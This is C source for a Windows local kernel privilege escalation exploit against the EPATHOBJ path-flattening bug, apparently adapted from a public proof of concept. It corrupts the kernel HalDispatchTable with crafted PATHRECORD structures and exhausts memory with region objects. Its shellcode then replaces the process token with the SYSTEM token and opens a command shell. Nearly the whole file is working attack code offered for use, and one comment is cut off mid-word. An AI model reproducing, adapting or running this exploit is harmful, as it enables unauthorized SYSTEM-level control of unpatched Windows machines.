#include "ComplexPath.h"

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

// Search the specified data structure for a member with CurrentValue.
BOOL FindAndReplaceMember(PDWORD Structure,
                          DWORD CurrentValue,
                          DWORD NewValue,
                          DWORD MaxSize)
{
    DWORD i, Mask;

    // Microsoft QWORD aligns object pointers, then uses the lower three
    // bits for quick reference counting.
    Mask = ~7;

    // Mask out the reference count.
    CurrentValue &= Mask;

    // Scan the structure for any occurrence of CurrentValue.
    for (i = 0; i < MaxSize; i++) {
        if ((Structure[i] & Mask) == CurrentValue) {
            // And finally, replace it with NewValue.
            Structure[i] = NewValue;
            return TRUE;
        }
    }

    // Member not found.
    return FALSE;
}


// This routine is injected into nt!HalDispatchTable by EPATHOBJ::pprFlattenRec.
ULONG __stdcall ShellCode(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)
{
    PVOID  TargetProcess;

    // Record that the exploit completed.
    ComplexPathFinished = 1;

    // Fix the corrupted HalDispatchTable,
    HalDispatchTable[1] = HalQuerySystemInformation;

    // Find the EPROCESS structure for the process I want to escalate
    if (PsLookupProcessByProcessId(TargetPid, &TargetProcess) == STATUS_SUCCESS) {
        PACCESS_TOKEN SystemToken;
        PACCESS_TOKEN TargetToken;

        // Find the Token object for my target process, and the SYSTEM process.
        TargetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(TargetProcess);
        SystemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*PsInitialSystemProcess);

        // Find the token in the target process, and replace with the system token.
        FindAndReplaceMember((PDWORD) TargetProcess,
                             (DWORD)  TargetToken,
                             (DWORD)  SystemToken,
                             0x200);
    }

    return 0;
}

// I use this routine to generate a table of acceptable stub addresses. The
// 0x40 offset is the location of the PULONG parameter to
// nt!NtQueryIntervalProfile. Credit to progmboy for coming up with this clever
// trick.
VOID __declspec(naked) HalDispatchRedirect(VOID)
{
    __asm inc eax
    __asm jmp dword ptr [ebp+0x40]; //  0
    __asm inc ecx
    __asm jmp dword ptr [ebp+0x40]; //  1
    __asm inc edx
    __asm jmp dword ptr [ebp+0x40]; //  2
    __asm inc ebx
    __asm jmp dword ptr [ebp+0x40]; //  3
    __asm inc esi
    __asm jmp dword ptr [ebp+0x40]; //  4
    __asm inc edi
    __asm jmp dword ptr [ebp+0x40]; //  5
    __asm dec eax
    __asm jmp dword ptr [ebp+0x40]; //  6
    __asm dec ecx
    __asm jmp dword ptr [ebp+0x40]; //  7
    __asm dec edx
    __asm jmp dword ptr [ebp+0x40]; //  8
    __asm dec ebx
    __asm jmp dword ptr [ebp+0x40]; //  9
    __asm dec esi
    __asm jmp dword ptr [ebp+0x40]; // 10
    __asm dec edi
    __asm jmp dword ptr [ebp+0x40]; // 11

    // Mark end of table.
    __asm {
        _emit 0
        _emit 0
        _emit 0
        _emit 0
    }
}

int main(int argc, char **argv)
{
	LogMessage(L_INFO, "\r--------------------------------------------------\n"
                       "\rWindows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit\n"
                       "\r------------------- taviso () cmpxchg8b com, programmeboy () gmail com ---\n"
                       "\n");
	while(1)
	{
		getchar();
		exploit();
	}
}

int exploit()
{
    HDC                  Device;
    ULONG                Size;
    ULONG                PointNum;
    HMODULE              KernelHandle;
    PULONG               DispatchRedirect;
    PULONG               Interval;
    ULONG                SavedInterval;
    RTL_PROCESS_MODULES  ModuleInfo;

    NtQueryIntervalProfile    = GetProcAddress(GetModuleHandle("ntdll"), "NtQueryIntervalProfile");
    NtQuerySystemInformation  = GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    DispatchRedirect          = (PVOID) HalDispatchRedirect;
    Interval                  = (PULONG) ShellCode;
    SavedInterval             = Interval[0];
	TargetPid                 = (PULONG)GetCurrentProcessId();

    LogMessage(L_INFO, "NtQueryIntervalProfile@%p", NtQueryIntervalProfile);
    LogMessage(L_INFO, "NtQuerySystemInformation@%p", NtQuerySystemInformation);

    // Lookup the address of system modules.
    NtQuerySystemInformation(SystemModuleInformation,
                             &ModuleInfo,
                             sizeof ModuleInfo,
                             NULL);

    LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s@%p",
                        ModuleInfo.Modules[0].FullPathName,
                        ModuleInfo.Modules[0].ImageBase);

    // Lookup some system routines we require.
    KernelHandle                = LoadLibrary(ModuleInfo.Modules[0].FullPathName + ModuleInfo.Modules[0].OffsetToFileName);
    HalDispatchTable            = (ULONG) GetProcAddress(KernelHandle, "HalDispatchTable")           - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsInitialSystemProcess      = (ULONG) GetProcAddress(KernelHandle, "PsInitialSystemProcess")     - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsReferencePrimaryToken     = (ULONG) GetProcAddress(KernelHandle, "PsReferencePrimaryToken")    - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsLookupProcessByProcessId  = (ULONG) GetProcAddress(KernelHandle, "PsLookupProcessByProcessId") - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;

    // Search for a ret instruction to install in the damaged HalDispatchTable.
    HalQuerySystemInformation   = (ULONG) memchr(KernelHandle, 0xC3, ModuleInfo.Modules[0].ImageSize)
                                - (ULONG) KernelHandle
                                + (ULONG) ModuleInfo.Modules[0].ImageBase;

    LogMessage(L_INFO, "Discovered a ret instruction at %p", HalQuerySystemInformation);

    // Now we need to create a PATHRECORD at an address that is also a valid
    // x86 instruction, because the pointer will be interpreted as a function.
    // I've created a list of candidates in DispatchRedirect.
    LogMessage(L_INFO, "Searching for an available stub address...");

	// 0x4065ff40 inc eax, jmp [ebp + 0x40h]
    while (!VirtualAlloc(*DispatchRedirect & ~(PAGE_SIZE - 1),
                         PAGE_SIZE * 2,
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE)) {

        LogMessage(L_WARN, "\tVirtualAlloc(%#x) => %#x",
                            *DispatchRedirect & ~(PAGE_SIZE - 1),
                            GetLastError());

        // This page is not available, try the next candidate.
        if (!*++DispatchRedirect) {
            LogMessage(L_ERROR, "No redirect candidates left, sorry!");
            ExitProcess(1);
        }
	}

    // This PATHRECORD must terminate the list and recover.
    ExploitRecordExit           = (PPATHRECORD)*DispatchRedirect;
	LogMessage(L_INFO, "Success, ExploitRecordExit@%#0x", ExploitRecordExit);

    ExploitRecordExit->next     = NULL; 
    ExploitRecordExit->prev     = NULL;
    ExploitRecordExit->flags    = PD_BEGINSUBPATH;
    ExploitRecordExit->count    = 0;

	LogMessage(L_INFO, "  ->next  @ %p", ExploitRecordExit->next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecordExit->prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecordExit->flags);
	
    LogMessage(L_INFO, "ExploitRecord@%#0x", &ExploitRecord);

    ExploitRecord.next          = (PPATHRECORD)*DispatchRedirect;
    ExploitRecord.prev          = (PPATHRECORD)&HalDispatchTable[1];
    ExploitRecord.flags         = PD_BEZIERS | PD_BEGINSUBPATH;
    ExploitRecord.count         = 4;

	LogMessage(L_INFO, "  ->next  @ %p", ExploitRecord.next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecord.prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecord.flags);

	    // Create our PATHRECORD in user space we will get added to the EPATHOBJ
    // pathrecord chain.
    PathRecord = (PPATHRECORD)VirtualAlloc(NULL,
                              sizeof *PathRecord,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);

    LogMessage(L_INFO, "Allocated userspace PATHRECORD@%p", PathRecord);

    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite
    // loop in EPATHOBJ::bFl
    PathRecord->flags   = 0;
    PathRecord->next    = (PPATHRECORD)&ExploitRecord;
    PathRecord->prev    = 0;

    // This is the second stage PATHRECORD, which causes a fresh PATHRECORD
    // allocated from newpathrec to nt!HalDispatchTable. The Next pointer will
    // be copied over to the new record. Therefore, we get
    //
    // nt!HalDispatchTable[1] = &ExploitRecordExit.
    //
    // So we make &ExploitRecordExit a valid sequence of instuctions here.
    LogMessage(L_INFO, "Creating complex bezier path with %p", (ULONG)(PathRecord) >> 4);


	// Generate a large number of Belier Curves made up of pointers to our
    // PATHRECORD object.
    for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
        PointTypes[PointNum]    = 0x10;
    }

    // Get a handle to this Desktop.
    Device = GetDC(NULL);


	/* First call to PolyDraw fills exactly one page with controlled data. */
	  BeginPath(Device);
	  PolyDraw(Device, Points, PointTypes, 498);
	  EndPath(Device);

	/* On BeginPath() previously allocated data is freed to the freelist. */
	 BeginPath(Device);

	 /* Freed memory is reallocated during PolyDraw() call without memory 
	  being memset()ed thus the returned memory area is filled with
	  user-controlled data.*/
	 PolyDraw(Device, Points, PointTypes, 483);

	 	LogMessage(L_INFO, "Begin CreateRoundRectRgn cycle");

    // We need to cause a specific AllocObject() to fail to trigger the
    // exploitable condition. To do this, I create a large number of rounded
    // rectangular regions until they start failing. I don't think it matters
    // what you use to exhaust paged memory, there is probably a better way.
    for (Size = 1 << 26; Size; Size >>= 1) {
        while (Regions[ComplexPathNumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
            ComplexPathNumRegion++;
    }

    LogMessage(L_INFO, "Allocated %u HRGN objects", ComplexPathNumRegion);
    LogMessage(L_INFO, "Flattening curves...");

	/* Trigger the bug: Insert crafted "next" pointer into PATHRECORD structure list */
	  FlattenPath(Device);

	  /* Free memory: Let the kernel breath. */
	  while (ComplexPathNumRegion)
		DeleteObject(Regions[--ComplexPathNumRegion]);

	  /* Trigger invalid pointer dereference. */
	  FlattenPath(Device);

	 NtQueryIntervalProfile(ProfileTotalIssues, Interval);

	*Interval = SavedInterval;
	EndPath(Device);
	ReleaseDC(NULL, Device);


	ComplexPathFinished = 1;
    if (ComplexPathFinished) {
        LogMessage(L_INFO, "Success...", ComplexPathFinished);
		ShellExecute(NULL, "open", "cmd", NULL, NULL, SW_SHOW); // Check it worked
		return;
    }

    // If we reach here, we didn't trigger the condition. Let the other thread know.


    // Try again...
    LogMessage(L_ERROR, "No luck, run exploit again (it can take several attempts)");
    ExitProcess(1);
}

// A quick logging routine for debug messages.
BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
{
    CHAR Buffer[1024] = {0};
    va_list Args;

    va_start(Args, Format);
        vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
    va_end(Args);

    switch (Level) {
        case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
        case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
        case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
        case L_ERROR: fprintf(stderr, "[!] %s\n", Buffer); break;
    }

    fflush(stdout);
    fflush(stderr);

    return TRUE;
}
